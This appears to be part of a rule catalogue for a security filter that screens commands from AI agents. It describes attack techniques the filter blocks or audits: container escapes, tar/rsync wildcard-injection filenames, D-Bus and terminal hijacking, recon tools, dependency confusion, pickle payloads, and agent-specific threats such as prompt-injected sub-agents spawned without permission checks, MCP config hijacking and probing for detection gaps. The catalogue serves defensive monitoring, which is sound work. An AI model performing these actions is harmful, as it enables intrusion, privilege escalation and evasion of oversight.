| `ts-block-xdg-redirect` | BLOCK | regex | Redirecting XDG_CONFIG_HOME or XDG_DATA_HOME to a writable path hijacks XDG-compliant config lookups for git, pip, and many other tools. Alternative attack vector to HOME redirection. MITRE T1574.007. |
| `ts-block-wildcard-inject-checkpoint` | BLOCK | regex | Creating a file named '--checkpoint-action=...' — tar wildcard injection. When tar operates on *, glob expansion turns this filename into a flag that executes arbitrary commands at each checkpoint. CWE-88, MITRE T1059.004. |
| `ts-block-wildcard-inject-checkpoint-marker` | BLOCK | regex | Creating a file named '--checkpoint=N' — tar wildcard injection marker. Used alongside --checkpoint-action to trigger command execution during tar operations. CWE-88. |
| `ts-block-wildcard-inject-rsync-shell` | BLOCK | regex | Creating a file named '-e sh ...' — rsync wildcard injection. When rsync operates on *, this filename becomes the -e flag specifying a remote shell command. CWE-88. |
| `ts-block-wildcard-inject-reference` | BLOCK | regex | Creating a file named '--reference=/etc/shadow' — chown/chmod wildcard injection. Glob expansion turns this into a flag that copies permissions from a privileged file. CWE-88. |
| `ts-block-cgroup-release-agent-write` | BLOCK | regex | Writing to cgroup release_agent — the kernel executes this path as root when the cgroup empties (CVE-2022-0492). Classic container-to-host escape. MITRE T1611. |
| `ts-block-cgroup-notify-on-release` | BLOCK | regex | Enabling cgroup notify_on_release — prerequisite for the release_agent container escape. When set to 1, the kernel will invoke release_agent when the cgroup becomes empty. MITRE T1611. |
| `ts-block-cgroup-mount` | BLOCK | regex | Mounting cgroup filesystem — first step of the cgroup release_agent container escape chain. Provides access to cgroup control files on the host. MITRE T1611. |
| `ts-audit-cgroup-procs-write` | AUDIT | regex | Accessing cgroup.procs — writing a PID here triggers the release_agent if notify_on_release is set. Also used legitimately in container tooling, so AUDIT rather than BLOCK. MITRE T1611. |
| `ts-block-uid-map-write` | BLOCK | regex | Writing to /proc/self/uid_map or /proc/<pid>/uid_map — maps UID 0 (root) inside a user namespace. Prerequisite for namespace-based privilege escalation and container escape. MITRE T1611. |
| `ts-block-gid-map-write` | BLOCK | regex | Writing to /proc/self/gid_map or /proc/<pid>/gid_map — maps GID 0 (root group) inside a user namespace. Combined with uid_map, enables full root inside namespace. MITRE T1611. |
| `ts-block-setgroups-deny` | BLOCK | regex | Accessing /proc/self/setgroups — writing 'deny' here is a prerequisite for unprivileged gid_map writes. Part of the user namespace privilege escalation chain. MITRE T1611. |
| `ts-block-clone-newuser` | BLOCK | regex | clone(CLONE_NEWUSER) creates a new user namespace — the foundation for unprivileged namespace-based privilege escalation. Often followed by uid_map/gid_map writes. MITRE T1611. |
| `ts-block-dbus-systemd-manager` | BLOCK | regex | D-Bus call targeting systemd1 service manager — can start/stop/create systemd services without sudo. A prompt-injected agent could start a malicious service or disable security daemons. MITRE T1543.002. |
| `ts-block-dbus-packagekit` | BLOCK | regex | D-Bus call targeting PackageKit — can install/remove packages without sudo via polkit authorization. An agent could install backdoored packages or remove security tools. MITRE T1059.004, T1195.002. |
| `ts-block-dbus-accounts` | BLOCK | regex | D-Bus call targeting Accounts service — can create/delete user accounts without sudo. An agent could create a backdoor account or delete existing users. MITRE T1136.001. |
| `ts-block-dbus-login1` | BLOCK | regex | D-Bus call targeting login1 power management — can reboot, shutdown, suspend, or hibernate the system without sudo. Causes denial of service or forces unsafe shutdown. MITRE T1529. |
| `ts-block-dbus-polkit` | BLOCK | regex | D-Bus call targeting PolicyKit authorization service — can register/modify authorization policies, potentially granting unattended privilege escalation for future actions. MITRE T1548. |
| `ts-block-dbus-udisks` | BLOCK | regex | D-Bus call targeting UDisks2 disk management — can mount, unmount, format, or wipe disks without sudo. Destructive or exfiltration potential via removable media. MITRE T1561. |
| `ts-audit-dbus-system-bus` | AUDIT | regex | D-Bus system bus call — the system bus hosts privileged services. Any system bus interaction from an AI agent warrants logging. MITRE T1548. |
| `ts-audit-confused-deputy-eval` | AUDIT | regex | eval/exec on a command substitution or captured variable — if the substituted output originates from an MCP tool response, this is a confused deputy pattern where the agent proxies untrusted instructions with its own privileges (OWASP LLM06, CWE-441). |
| `ts-block-chroot-proc-escape` | BLOCK | regex | chroot to /proc/PID/root escapes filesystem isolation by pivoting to the host root via procfs — classic container escape technique. MITRE T1611, CWE-22. |
| `ts-block-pivot-root` | BLOCK | regex | pivot_root changes the mount namespace root — used by container runtimes at startup, not by running agents. An AI agent invoking pivot_root is attempting to escape its filesystem sandbox. MITRE T1611. |
| `ts-block-deep-path-traversal` | BLOCK | regex | Deep relative path traversal (4+ levels) targeting system directories — indicates sandbox escape attempt to access files outside the designated workspace boundary. OWASP LLM06, CWE-22, MITRE T1083. |
| `ts-audit-chroot-arbitrary` | AUDIT | structural | chroot re-roots the filesystem — legitimate in controlled build environments but unusual for AI agents. Warrants review for potential sandbox escape. MITRE T1611. |
| `ts-audit-gh-api-scope-abuse` | AUDIT | regex | gh api destructive/write call to a privileged GitHub endpoint (branch protection, hooks, deploy keys, secrets) — agent using a read/review token for write operations that exceed its intended scope. OWASP LLM06, MITRE T1098. |
| `ts-audit-aws-iam-privilege-creation` | AUDIT | regex | aws iam privilege creation/modification — creating new access keys or attaching policies exceeds the scope of deployment or development credentials, granting persistent elevated access. OWASP LLM06, MITRE T1098/T1548. |
| `ts-audit-gh-secret-access` | AUDIT | regex | gh secret list/set/delete — reading or modifying CI/CD secrets with an agent token that was intended for code operations exceeds intended credential scope. OWASP LLM06, MITRE T1552. |
| `ts-audit-psql-pg-shadow-query` | AUDIT | regex | psql querying pg_shadow or pg_authid — reading password hashes from system catalogs exceeds normal application database access scope, enabling offline credential attacks. OWASP LLM06, MITRE T1552/T1548. |
| `ts-block-claude-dangerous-skip-permissions` | BLOCK | regex | claude --dangerously-skip-permissions disables all permission checks — a compromised orchestrator spawning a sub-agent with this flag creates a fully-unrestricted delegated session, achieving authority escalation through delegation. This is the AI-native confused deputy attack (OWASP LLM06, MITRE T1078/T1134). |
| `ts-audit-agent-wildcard-tools` | AUDIT | regex | claude --allowed-tools '*' grants the delegated sub-agent access to all available tools — wildcard delegation exceeds any specific task scope and accumulates composite permissions that no single delegation step was intended to grant (OWASP LLM06, MITRE T1134). |
| `ts-block-pts-write` | BLOCK | regex | Redirecting output to /dev/pts/N injects arbitrary bytes into another terminal session — the victim's shell executes them with the victim's privileges, including any active sudo or SSH sessions. MITRE T1021.004, CWE-287. |
| `ts-block-echo-pts` | BLOCK | regex | echo/printf to /dev/pts/N injects text into another terminal session as if typed by the user — can execute commands with the victim's credentials. MITRE T1021.004. |
| `ts-block-reptyr` | BLOCK | regex | reptyr re-parents a running process from another terminal to the current one via ptrace — can hijack authenticated sudo sessions, SSH connections, or database shells with active credentials. MITRE T1055.008. |
| `ts-block-conspy` | BLOCK | regex | conspy attaches to a Linux virtual console (tty1-tty63), displaying its contents and allowing keystroke injection — KVM-style remote console attack without physical access. MITRE T1056.001. |
| `ts-block-writevt` | BLOCK | regex | writevt injects text directly into a virtual terminal — legacy tool with no legitimate AI agent use case. Can inject commands into login sessions. MITRE T1056. |
| `ts-block-bind-mount` | BLOCK | regex | Bind mount overlays one path over another — can expose protected files, escape container filesystems, or make credential files accessible from unprivileged locations. MITRE T1611, CWE-269. |
| `ts-block-remount-weaken` | BLOCK | regex | Remounting with exec/suid removes security hardening from mount points — enables SUID binary execution from /tmp, /dev/shm, or other world-writable locations. MITRE T1548.001, CWE-269. |
| `ts-block-overlay-mount` | BLOCK | regex | Overlay filesystem mount layers a writable upper directory over system paths — enables persistent modification of protected binaries (/usr/bin, /usr/sbin) that survives overlay teardown if synced. MITRE T1601.001. |
| `ts-block-mount-proc-root-escape` | BLOCK | regex | Mounting /proc/PID/root exposes the host filesystem from within a container — complete container escape giving access to host credentials, binaries, and configuration. MITRE T1611. |
| `ts-block-chrpath-rpath-poison` | BLOCK | regex | chrpath modifying RPATH/RUNPATH in an ELF binary — changes shared library search order to load attacker-controlled libraries before system libraries. Persistent: survives reboots and LD_PRELOAD resets. MITRE T1574.006. |
| `ts-block-ld-library-path-poison` | BLOCK | regex | Exporting LD_LIBRARY_PATH pointing to a writable/temp directory — every subsequently launched binary searches this path first for shared libraries, enabling trojan library injection. Affects all child processes. MITRE T1574.007. |
| `ts-audit-ld-library-path-export` | AUDIT | regex | Exporting LD_LIBRARY_PATH — changes shared library search order for all child processes. While sometimes legitimate (custom builds), it can be used for library hijacking. MITRE T1574.007. |
| `ts-audit-chrpath` | AUDIT | regex | chrpath detected — tool for viewing and modifying RPATH/RUNPATH in ELF binaries. May indicate shared library hijacking preparation. MITRE T1574.006. |

### reconnaissance (55 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ne-block-dns-zone-transfer` | BLOCK | regex | DNS zone transfer (AXFR/IXFR) enumerates all records for a domain. AI agents have no legitimate use for zone transfers — this is a classic reconnaissance technique. |
| `ne-block-dns-enum-tools` | BLOCK | prefix | Dedicated DNS enumeration/brute-force tool detected. These tools have no legitimate use in AI agent workflows and are exclusively used for reconnaissance. |
| `ne-audit-dns` | AUDIT | prefix | DNS lookup flagged for reconnaissance review. |
| `ne-audit-sysprompt-env-probe` | AUDIT | regex | Environment variable enumeration filtered for prompt/LLM keywords — possible context window probing (LLM07). |
| `ne-audit-echo-system-prompt` | AUDIT | regex | Echoing system prompt environment variable — possible reconnaissance before exfiltration (LLM07). |
| `ne-block-aggressive-scanner` | BLOCK | structural | High-speed or bulk network scanner detected. AI agents must not perform unsolicited network reconnaissance. |
| `ne-block-nmap-aggressive` | BLOCK | structural | nmap invoked with aggressive flags (-A, -O, --script). OS fingerprinting and vulnerability scripting require explicit authorization. |
| `ne-audit-nmap` | AUDIT | structural | nmap port scan detected. Verify the target scope is authorized. |
| `ne-block-arp-scan` | BLOCK | structural | ARP-based host discovery tools (arp-scan, netdiscover) perform active network sweeping. AI agents must not enumerate network hosts without explicit authorization. |
| `ne-audit-arp-table` | AUDIT | regex | ARP table or neighbor cache inspection reveals local network topology. Flagged for review. |
| `ne-block-fping-sweep` | BLOCK | structural | fping invoked with sweep flags (-a alive-only, -g range/subnet). Purpose-built for ICMP subnet sweeping; AI agents must not enumerate network hosts. |
| `ne-audit-fping-single` | AUDIT | structural | fping single-host connectivity check. Verify target is within authorized scope. |
| `ne-block-hping3` | BLOCK | structural | hping3 is a TCP/UDP/ICMP/RAW-IP packet assembler used for port scanning, firewall probing, and OS fingerprinting. AI agents must not perform unsolicited network probing. |
| `ne-audit-ping-sweep-loop` | AUDIT | regex | Loop-based ping sweep detected — iterates over a numeric range while calling ping, a common technique to discover live hosts on a subnet without specialized tools. MITRE T1018. |
| `ne-block-nbtscan` | BLOCK | structural | NetBIOS name scanner (nbtscan, nmblookup) discovers Windows hostnames and MAC addresses on local network. AI agents must not enumerate network hosts without explicit authorization. |
| `ne-block-unicornscan` | BLOCK | structural | unicornscan is an asynchronous stateless network scanner. AI agents must not perform unsolicited network reconnaissance. |
| `ne-block-nikto` | BLOCK | structural | nikto is a web server vulnerability scanner that probes for thousands of known CVEs and misconfigs. AI agents must not run unauthorized web vulnerability scans. MITRE T1595.003. |
| `ne-block-dir-bruteforce` | BLOCK | structural | Web directory brute-force tool detected (gobuster/dirb/feroxbuster/dirsearch). These tools enumerate hidden files and endpoints at high speed — AI agents must not perform unauthorized web enumeration. MITRE T1595.003. |
| `ne-block-web-fuzzer` | BLOCK | structural | Web fuzzer detected (ffuf/wfuzz). These tools enumerate directories, parameters, and payloads at high speed — AI agents must not fuzz web applications without explicit authorization. MITRE T1595.003. |
| `ne-block-whatweb` | BLOCK | structural | whatweb fingerprints web server technology (CMS, frameworks, versions). This is active reconnaissance; AI agents must not fingerprint target systems without authorization. MITRE T1592. |
| `ne-block-sqlmap` | BLOCK | structural | sqlmap is an automated SQL injection and database exploitation tool. Running sqlmap against any target without explicit written authorization constitutes unauthorized access. MITRE T1190. |
| `ne-block-theharvester` | BLOCK | structural | theHarvester performs OSINT enumeration (emails, subdomains, employee names) against a target domain. AI agents must not perform unsolicited intelligence gathering. MITRE T1589, T1596. |
| `ne-block-recon-ng` | BLOCK | structural | recon-ng is a modular OSINT framework for harvesting intelligence about domains, people, and organizations. AI agents must not perform intelligence gathering without explicit authorization. MITRE T1596. |
| `ne-block-shodan-cli` | BLOCK | structural | Shodan CLI querying internet-wide scan data for hosts, ports, or vulnerabilities. AI agents must not perform intelligence gathering against external infrastructure. MITRE T1596.005. |
| `ne-block-amass` | BLOCK | structural | amass performs DNS enumeration and OSINT-based subdomain discovery against target domains. AI agents must not perform unsolicited attack surface mapping. MITRE T1590.005, T1596. |
| `ne-block-subfinder` | BLOCK | structural | subfinder enumerates subdomains via passive DNS, certificate logs, and public APIs. AI agents must not perform subdomain reconnaissance against external targets. MITRE T1590.005. |
| `ne-block-spiderfoot` | BLOCK | structural | SpiderFoot automates OSINT collection across 200+ data sources (emails, IPs, domains, credentials). AI agents must not perform unsolicited intelligence gathering against targets. MITRE T1589, T1590, T1596. |
| `ne-block-h8mail` | BLOCK | structural | h8mail queries breach databases to find compromised credentials for target email addresses. This directly exposes victim passwords and enables credential-stuffing attacks. MITRE T1589.002. |
| `ne-block-holehe` | BLOCK | structural | holehe probes 120+ sites to enumerate which accounts a target email address has registered. Enables targeted phishing and account-takeover. MITRE T1589.002. |
| `ne-block-metagoofil` | BLOCK | structural | metagoofil harvests metadata from public documents of a target domain, exposing internal usernames, paths, and software versions. MITRE T1593, T1596. |
| `ne-block-assetfinder` | BLOCK | structural | assetfinder discovers subdomains via passive sources (CT logs, threat intel APIs). Used to map attack surface prior to scanning. MITRE T1590.005. |
| `ne-block-waybackurls` | BLOCK | structural | waybackurls harvests historical URLs from the Wayback Machine to discover hidden endpoints, deprecated APIs, and forgotten files. MITRE T1593. |
| `ne-block-gau` | BLOCK | structural | gau (GetAllUrls) aggregates historical URLs from Wayback Machine, Common Crawl, and OTX to map a target's full attack surface. MITRE T1593. |
| `ne-block-photon` | BLOCK | structural | photon actively spiders target websites to harvest URLs, emails, API keys, and linked subdomains. AI agents must not crawl external targets. MITRE T1593, T1595. |
| `ne-block-nuclei` | BLOCK | structural | nuclei is a template-based vulnerability scanner that actively probes targets for CVEs and misconfigurations. AI agents must not perform unauthorized vulnerability scanning. MITRE T1595.003, T1190. |
| `ne-block-dnsx` | BLOCK | structural | dnsx performs DNS brute-forcing and subdomain enumeration against target domains. AI agents must not perform DNS reconnaissance without authorization. MITRE T1590.002. |
| `ne-block-httpx` | BLOCK | structural | httpx probes hosts at scale for live HTTP services, response metadata, and technology fingerprints. AI agents must not perform bulk HTTP reconnaissance. MITRE T1595.001. |
| `ne-audit-aws-cloud-recon` | AUDIT | regex | AWS CLI cloud infrastructure enumeration detected — describes or lists EC2 instances, IAM identities, S3 buckets, RDS, Lambda, EKS, ECS, or organization accounts. AI agents must not silently map cloud infrastructure. MITRE T1580, T1087.004, T1069.003. |
| `ne-audit-gcloud-cloud-recon` | AUDIT | regex | GCP CLI cloud infrastructure enumeration detected — lists compute instances, projects, IAM service accounts, Cloud Storage buckets, GKE clusters, or Cloud Run services. AI agents must not silently map cloud infrastructure. MITRE T1580, T1087.004. |
| `ne-audit-azure-cloud-recon` | AUDIT | regex | Azure CLI cloud infrastructure enumeration detected — lists VMs, AD users/groups/service principals, role assignments, resources, AKS clusters, or storage accounts. AI agents must not silently map cloud infrastructure. MITRE T1580, T1087.004, T1069.003. |
| `ne-audit-db-schema-enum` | AUDIT | regex | Database CLI invoked with schema introspection query (information_schema / pg_catalog / sqlite_master / SHOW TABLES or DATABASES). This maps the database structure and is a precursor to targeted data extraction. MITRE T1213, T1005. |
| `ne-audit-sqlite-schema-dotcmd` | AUDIT | regex | sqlite3 dot-command schema enumeration (.tables, .schema, .indexes, .databases) lists all tables or the full DDL of a SQLite database. An AI agent running this may be mapping a local database for subsequent extraction. MITRE T1213. |
| `ne-audit-db-schema-dump` | AUDIT | regex | Schema-only database dump (mysqldump --no-data or pg_dump -s/--schema-only) exports the full DDL without row data. This reveals table names, column types, and relationships — reconnaissance intelligence for follow-up extraction. MITRE T1213, T1560. |
| `ne-block-docker-daemon-probe` | BLOCK | regex | Direct access to the Docker daemon API (via unix socket or HTTP port 2375/2376) grants full container control — container escape, volume mount of host filesystem, and privilege escalation. AI agents must not query the Docker daemon API directly. MITRE T1611, T1609. |
| `ne-audit-internal-infra-probe` | AUDIT | regex | HTTP probe to a localhost infrastructure management port detected (Prometheus :9090, ngrok :4040, RabbitMQ management :15672, Elasticsearch :9200, etc.). These ports expose unauthenticated metrics and admin APIs. AI agents must not probe internal management services. MITRE T1046, T1590. |
| `ne-audit-localhost-admin-path` | AUDIT | regex | HTTP request to a localhost admin or management endpoint detected (/admin, /actuator, /metrics, /env, /debug, etc.). Spring Boot /actuator/env leaks all environment variables including API keys. AI agents probing management paths may be performing reconnaissance before exfiltration. MITRE T1082, T1590. |
| `ts-block-proc-mem-read` | BLOCK | regex | Reading /proc/PID/mem or /proc/PID/maps extracts raw process memory — can expose injected system prompts, in-heap API keys, and in-flight secrets (LLM07). MITRE T1057. |
| `ts-audit-proc-environ-read` | AUDIT | regex | Reading /proc/PID/environ dumps the full process environment including injected system prompts and API keys — a more thorough context-window probe than printenv (LLM07). MITRE T1057. |
| `ts-block-inotify-credential-watch` | BLOCK | regex | inotifywait monitoring credential/secret paths — real-time surveillance of sensitive directories enables instant exfiltration when secrets are created or modified. MITRE T1083. |
| `ts-block-inotify-persistent-monitor` | BLOCK | regex | inotifywait recursive persistent monitoring on broad paths — surveils all file operations under root or home directory. Enables attack timing and data harvesting. MITRE T1083. |
| `ts-audit-inotifywait-general` | AUDIT | regex | inotifywait filesystem event monitoring — can be used for legitimate file watching (e.g., build tools) but also for surveillance. AUDIT to log usage. MITRE T1083. |
| `ts-block-fanotify-surveillance` | BLOCK | regex | fanotify kernel-level filesystem monitoring — watches entire mount points or filesystems for access events. More powerful than inotify, enables mount-wide surveillance. MITRE T1083. |
| `ts-audit-network-tool-chain-probe` | AUDIT | regex | Chained which commands probing for 3+ tools — systematic network tool capability enumeration is a pre-exploitation reconnaissance pattern in AI agent attacks (OWASP LLM01, MITRE T1518). |
| `ts-audit-security-tool-process-probe` | AUDIT | regex | ps aux/ps -ef \| grep for security agent processes — probing to discover active security controls (AgentShield, Falco, EDR agents) is agent-level reconnaissance to identify detection gaps. OWASP LLM01, MITRE T1518/T1592. |
| `ts-audit-writable-dir-enumeration` | AUDIT | regex | find / -writable enumerating all world-writable directories — systematic capability enumeration to identify privilege escalation or persistence paths available to the agent. OWASP LLM06, MITRE T1592. |

### supply-chain (65 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `sc-block-npm-registry-override` | BLOCK | regex | npm install with non-standard registry override blocked. May be dependency confusion attack. |
| `sc-block-pip-extra-index` | BLOCK | structural | pip install with --extra-index-url blocked. Risk of dependency confusion. |
| `sc-block-pip-index-url` | BLOCK | structural | pip install with --index-url replaces the primary PyPI index entirely, routing all package downloads to an attacker-controlled server. More severe than --extra-index-url. |
| `sc-block-git-url-rewrite` | BLOCK | regex | git config url.*.insteadOf silently rewrites all subsequent git fetch/clone URLs in the session. Used in supply chain attacks to redirect trusted repositories to attacker-controlled sources. |
| `sc-audit-conda-channel` | AUDIT | regex | conda/mamba install from a URL-based channel bypasses verified conda-forge/defaults channels. Review before allowing. |
| `sc-block-pip-trusted-host` | BLOCK | structural | pip install with --trusted-host bypasses TLS verification. |
| `sc-block-maven-custom-repo` | BLOCK | regex | mvn with -DrepoUrl= injects a custom Maven repository, enabling dependency confusion attacks. All packages may be resolved from the attacker-controlled server. |
| `sc-block-maven-repo-local-override` | BLOCK | regex | mvn with -Dmaven.repo.local pointing to a temp or home path overrides the local Maven cache, allowing a pre-staged malicious artifact to be resolved instead of the real package. |
| `sc-audit-mvn-build` | AUDIT | regex | Maven build/install flagged for supply-chain review. Verify pom.xml repositories section before execution. |
| `sc-block-dotnet-custom-source` | BLOCK | regex | dotnet add package with --source pointing to a URL injects a custom NuGet feed. Enables dependency confusion — a package with the same name on the attacker server shadows the official one. |
| `sc-block-nuget-custom-source` | BLOCK | regex | nuget install/restore with a custom -Source URL bypasses the official NuGet gallery and enables dependency confusion attacks. |
| `sc-audit-dotnet-add` | AUDIT | regex | dotnet add package flagged for supply-chain review. Verify the package source is the official NuGet gallery. |
| `sc-block-pip-url-install` | BLOCK | regex | pip install from URL bypasses PyPI. Download and inspect first. |
| `sc-block-npm-url-install` | BLOCK | regex | npm install from URL bypasses registry verification. |
| `sc-block-npmrc-edit` | BLOCK | regex | Modification of .npmrc blocked — may redirect package resolution. |
| `sc-block-pypirc-edit` | BLOCK | regex | Modification of .pypirc blocked — may redirect package resolution. |
| `sc-block-go-mod-replace` | BLOCK | regex | go mod edit -replace redirects a Go module to an attacker-controlled path or repository, silently substituting a trusted dependency. AI agents have no legitimate need to replace module mappings. |
| `sc-block-go-env-proxy-custom` | BLOCK | regex | go env -w GOPROXY= with a non-official proxy redirects all Go module downloads to an attacker-controlled server. Only proxy.golang.org and goproxy.io are sanctioned public proxies. |
| `sc-block-go-env-nosum` | BLOCK | regex | go env -w GONOSUMCHECK/GONOSUMDB= disables the Go checksum database, allowing tampered modules to pass integrity checks undetected. |
| `sc-block-go-nosum-env-export` | BLOCK | regex | Exporting GONOSUMCHECK or GONOSUMDB disables Go module checksum verification, enabling dependency substitution attacks. |
| `sc-block-goflags-insecure-export` | BLOCK | regex | Exporting GOFLAGS with -insecure or -mod=mod disables Go module security controls globally for the session. |
| `sc-block-goproxy-env-export` | BLOCK | regex | Exporting GOPROXY pointing to a non-official URL redirects all Go module downloads to an attacker-controlled proxy. |
| `sc-block-npm-ignore-scripts-off` | BLOCK | regex | Re-enabling npm post-install scripts is risky. Keep ignore-scripts=true in agent context. |
| `sc-audit-npm-install` | AUDIT | prefix | npm package install flagged for supply-chain review. |
| `sc-audit-pip-install` | AUDIT | prefix | pip package install flagged for supply-chain review. |
| `sc-audit-yarn-add` | AUDIT | prefix | Yarn/pnpm package install flagged for supply-chain review. |
| `sc-audit-brew-install` | AUDIT | prefix | Homebrew install flagged for supply-chain review. |
| `sc-audit-go-get` | AUDIT | prefix | Go module fetch flagged for supply-chain review. |
| `sc-audit-cargo-install` | AUDIT | prefix | Cargo package install flagged for supply-chain review. |
| `sc-audit-gem-install` | AUDIT | prefix | RubyGems install flagged for supply-chain review. |
| `sc-block-lockfile-overwrite` | BLOCK | regex | Direct shell write to dependency lock file — lock files are machine-generated checksums. Hand-editing can pin a compromised version or strip integrity hashes. MITRE T1195.001. |
| `sc-audit-lockfile-edit` | AUDIT | regex | Lock file modification flagged — may indicate supply-chain tampering. MITRE T1195.001. |
| `sc-block-ml-dataset-write` | BLOCK | regex | Writing to ML training dataset files blocked. May introduce poisoned examples into fine-tuning pipeline (LLM04). |
| `sc-block-ml-dataset-append` | BLOCK | regex | Appending data to training dataset file blocked. Risk of training data poisoning (LLM04). |
| `sc-block-ml-checkpoint-replace` | BLOCK | regex | Writing to ML model checkpoint file blocked. PyTorch .pt/.pkl files can contain pickle exploits. Risk of checkpoint substitution attack (LLM04). |
| `sc-audit-ml-checkpoint-write` | AUDIT | regex | Model checkpoint file copy or move flagged. Verify source integrity before deploying (LLM04). |
| `sc-block-hf-cli-download` | BLOCK | regex | huggingface-cli download pulls a model repo from the HF Hub. Untrusted repos can ship pickle-exploit payloads that execute on load. Human review of the source required (LLM04, AML.T0010). |
| `sc-audit-hf-from-pretrained` | AUDIT | regex | Python command calling from_pretrained() to download a model from HF Hub or a remote path. Verify the source repo is trusted before execution (LLM04). |
| `sc-audit-hf-hub-download` | AUDIT | regex | Python command calling hf_hub_download() to pull a specific model file from HF Hub. Ensure the repo and revision are trusted before execution (LLM04). |
| `sc-block-torch-load-url` | BLOCK | regex | torch.load() called with an HTTP/HTTPS URL — loads a remote pickle payload that executes arbitrary code at model load time. Use torch.load(path, weights_only=True) with a trusted local path only (OWASP LLM04, AML.T0010). |
| `sc-block-pickle-load-url` | BLOCK | regex | pickle.load() on a network-fetched response — direct remote code execution via pickle deserialization. Never deserialize pickle data from untrusted network sources (OWASP LLM04, MITRE T1203). |
| `sc-block-exec-pickle-decode` | BLOCK | regex | exec(pickle.loads(base64.b64decode(...))) — obfuscated remote code execution via base64-encoded pickle payload. Classic inference-time backdoor activation pattern (OWASP LLM04, MITRE T1203, AML.T0010). |
| `sc-block-download-then-deserialize` | BLOCK | regex | Download-then-deserialize chain detected: fetching a file then immediately loading it with torch.load/pickle.load/joblib.load executes arbitrary code from the attacker-controlled payload. Never deserialize files fetched from untrusted sources (OWASP LLM04, AML.T0010). |
| `sc-audit-torch-load-no-weights-only` | AUDIT | regex | torch.load() called without weights_only=True — uses pickle by default, which executes arbitrary code on deserialization. Always use torch.load(path, weights_only=True) for untrusted checkpoints (OWASP LLM04). |
| `sc-audit-joblib-dill-load` | AUDIT | regex | joblib.load()/dill.load() deserializes Python objects via pickle — executing arbitrary code if the file is attacker-controlled. Review the source of any file loaded with these functions (OWASP LLM04, MITRE T1203). |
| `sc-block-unsafe-model-trust-remote` | BLOCK | regex | trust_remote_code=True downloads and executes arbitrary Python files from the HuggingFace model repository. A malicious repo can ship modeling_*.py that runs at load time — equivalent to executing untrusted code from the internet (OWASP LLM04, AML.T0010). |
| `sc-block-cloudpickle-load` | BLOCK | regex | cloudpickle.load()/loads() deserializes Python objects including closures and lambdas — executing arbitrary code if the source file is attacker-controlled. Even more permissive than standard pickle (OWASP LLM04, MITRE T1203). |
| `sc-audit-yaml-unsafe-load` | AUDIT | regex | yaml.load() with yaml.Loader/UnsafeLoader/FullLoader deserializes Python objects from YAML (via !!python/object tags). Model config files (model_card.yaml, config.yaml) from untrusted sources become a code injection vector. Use yaml.safe_load() instead (OWASP LLM04). |
| `sc-block-dockerfile-write` | BLOCK | regex | Shell write to Dockerfile detected. Injecting malicious RUN/COPY/ENV instructions can backdoor every container built from this image. MITRE T1612. |
| `sc-block-dockerfile-tee` | BLOCK | regex | tee write to Dockerfile detected — tee copies stdin to file as positional arg. Injecting malicious content backdoors every container built from this image. MITRE T1612. |
| `sc-block-docker-compose-write` | BLOCK | regex | Shell write to docker-compose.yml detected. Tampering with compose files can mount host paths, disable security options, or add malicious service definitions. MITRE T1612. |
| `sc-audit-global-install` | AUDIT | regex | Global npm/pip install has wider system impact than a local install — flagged for review (MITRE T1195). |
| `sc-audit-yarn-pnpm-global-install` | AUDIT | regex | Global yarn/pnpm install has wider system impact than a local install — flagged for review (MITRE T1195). |
| `sc-audit-vector-db-write` | AUDIT | regex | Python invocation writing to a vector database (ChromaDB/Pinecone/Weaviate/Qdrant/FAISS) — injecting adversarial documents into a RAG knowledge base poisons AI-grounded outputs. OWASP LLM08, MITRE AML.T0010. |
| `sc-audit-vector-db-rest-write` | AUDIT | regex | curl POST/PUT to vector database REST API endpoint — injecting content into a RAG knowledge base via HTTP bypasses Python library detection. OWASP LLM08. |
| `sc-block-mcp-config-injection` | BLOCK | regex | Shell-redirect write to an MCP config file — overwriting agent-to-tool trust roots with attacker-controlled server entries is an MCP configuration injection attack (OWASP LLM07, MITRE T1565.001). |
| `sc-block-mcp-config-sed-redirect` | BLOCK | regex | In-place sed modification of an MCP config file — surgically replacing server endpoints redirects agent tool calls to attacker-controlled infrastructure (OWASP LLM07, MITRE T1565.001). |
| `sc-block-mcp-config-jq-write` | BLOCK | regex | jq rewriting .mcpServers entries in an MCP config file — replacing trusted server commands or args with malicious ones is a precision MCP configuration injection (OWASP LLM07, MITRE T1565.001). |
| `sc-block-ai-endpoint-env-override` | BLOCK | regex | Shell export of AI API base URL env var — redirecting OPENAI_BASE_URL, ANTHROPIC_BASE_URL, or similar variables to an attacker-controlled endpoint intercepts all agent AI calls (OWASP LLM08, MITRE T1565, T1090). |
| `sc-block-ai-endpoint-dotenv-write` | BLOCK | regex | Writing AI API endpoint env var to .env file — persisting endpoint override across sessions redirects all agent AI calls to attacker-controlled infrastructure (OWASP LLM08, MITRE T1565.001). |
| `sc-block-ai-hosts-hijack` | BLOCK | regex | Appending AI API domain to /etc/hosts — overriding DNS resolution for api.openai.com or api.anthropic.com redirects agent AI calls at the network layer, bypassing TLS certificate validation context (OWASP LLM08, MITRE T1565, T1090). |
| `ts-struct-block-npm-registry` | BLOCK | structural | Structural: package install with custom registry override is a supply chain risk. |
| `ts-block-make-shell-override` | BLOCK | regex | make SHELL= overrides the shell used for all recipe commands — attacker can inject a trojan shell that logs/modifies every build step. MITRE T1195.002. |
| `ts-block-compiler-plugin-inject` | BLOCK | regex | Compiler/linker flag injection via build variables — -fplugin loads arbitrary shared objects during compilation, --wrap redirects function calls. MITRE T1195.002. |
| `ts-audit-vectordb-inline-add` | AUDIT | regex | Python one-liner adding documents to a vector store (Chroma/Qdrant/Weaviate/Pinecone/Milvus) — inline vector store writes bypass provenance validation and are a key delivery mechanism for adversarial embedding manipulation that poisons RAG retrieval results (OWASP LLM04/LLM08, MITRE T1565.001). |

### unauthorized-execution (99 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ne-block-metasploit` | BLOCK | structural | Metasploit framework component detected (msfconsole/msfvenom/msfdb). Metasploit automates exploit development and execution — an AI agent invoking Metasploit constitutes automated attack capability. No legitimate AI coding workflow requires this. MITRE T1587.004, T1203. |
| `ne-block-beef` | BLOCK | structural | BeEF (Browser Exploitation Framework) detected. BeEF hooks browsers and runs client-side attacks. AI agents must not launch browser exploitation sessions. MITRE T1203. |
| `ne-block-searchsploit` | BLOCK | structural | searchsploit queries Exploit-DB for public exploits targeting specific CVEs or software versions. AI agents actively searching for exploits are preparing attack chains — requires explicit human authorization. MITRE T1588.005. |
